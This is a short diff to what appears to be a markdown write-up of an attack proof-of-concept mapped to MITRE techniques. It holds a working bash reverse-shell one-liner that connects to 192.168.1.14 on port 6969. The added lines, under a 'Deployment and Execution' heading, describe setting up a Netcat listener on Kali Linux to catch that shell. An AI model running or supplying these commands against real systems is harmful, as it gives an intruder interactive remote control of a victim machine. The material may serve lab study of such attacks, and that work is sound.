@@ -80,3 +80,15 @@ The following table maps the techniques used in this proof-of-concept to the [MI
 
 ```bash
 bash -c 'bash -i >& /dev/tcp/192.168.1.14/6969 0>&1'
+```
+---
+
+## Deployment and Execution
+
+### Attacker Setup (Kali Linux)
+
+The attacker prepares a Netcat listener on port `6969` to receive the reverse shell connection:
+
+```bash
+nc -lvnp 6969
+```
